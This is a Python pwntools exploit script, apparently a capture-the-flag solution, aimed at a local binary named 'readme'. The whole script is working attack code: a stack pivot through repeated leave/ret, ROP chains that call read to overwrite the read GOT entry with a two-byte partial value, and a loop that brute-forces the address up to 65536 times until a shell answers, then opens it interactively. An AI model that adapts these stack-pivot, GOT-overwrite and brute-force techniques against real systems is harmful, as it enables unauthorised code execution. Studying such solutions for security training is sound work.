from pwn import *

context.os = 'linux'
context.arch = 'amd64'

main_53 = 0x40062b
main_75 = 0x400641
addr = 0x601a00
read_got   = 0x601020
printf_plt = 0x4004b0
read_plt   = 0x4004c0

pop_rdi     = 0x4006b3
pop_rsi_r15 = 0x4006b1
ret         = 0x400499

# rsp: <stack rsp>
# rbp: <stack rbp>
payload = 'a' * 0x20 + p64(addr + 0x20) + p64(main_53)

# leave:
# rsp: <stack rbp> + 0x8 --> main
# rbp: addr + 0x20

# ret:
# rsp: <stack rbp> + 0x10 --> ???
# rbp: addr + 0x20
rop = flat(
        pop_rsi_r15, # locate at addr
        read_got + 0x10 - 0x30,
        0,
        read_plt)

payload2 = rop + p64((addr+0x20) + 0x20) + p64(main_53)

# leave:
# rsp: addr + 0x20 + 0x8 --> main
# rbp: addr + 0x40

# ret:
# rsp: addr + 0x20 + 0x10 --> ???
# rbp: addr + 0x40
rop = flat(
        read_plt, # locate at addr + 0x20
        main_75,
        0,
        0)
payload3 = rop + p64(addr - 0x10) + p64(main_53)

# leave:
# rsp: addr + 0x40 + 0x8 --> main
# rbp: addr - 0x10

# ret:
# rsp: addr + 0x40 + 0x10 --> ???
# rbp: addr - 0x10

# Return to rop chain
payload4 = 'a' * 0x20 + p64(addr) + p64(ret)

# leave:
# rsp: addr - 0x10 + 0x8 --> ret
# rbp: addr

# ret:
# rsp: addr - 0x10 + 0x10 --> pop_rsi_r15
# rbp: addr

payload5 = 'p' * 0x20 + '\x8c\xa3'

# The probability is (1/16) ^ 4
i = 0
while i < 65536:
    i += 1

    context.log_level = 'error'
    p = process('./readme')
    context.log_level = 'info'
    
    p.sendafter(':', payload)
    p.send(payload2)
    p.send(payload3)
    p.send(payload4)
    sleep(0.01)
    p.sendline(payload5)
    
    try:
        log.info('Times : ' + str(i))
        sleep(0.01)
        p.sendline('echo pwned_at_times_' + str(i))
        msg = p.recvline()
        if msg[:3] == 'pwn':
            log.success(msg)
            p.interactive()
            break
        else:
            log.failure(msg)
            context.log_level = 'error'
            p.close()
    except:
        context.log_level = 'error'
        p.close()
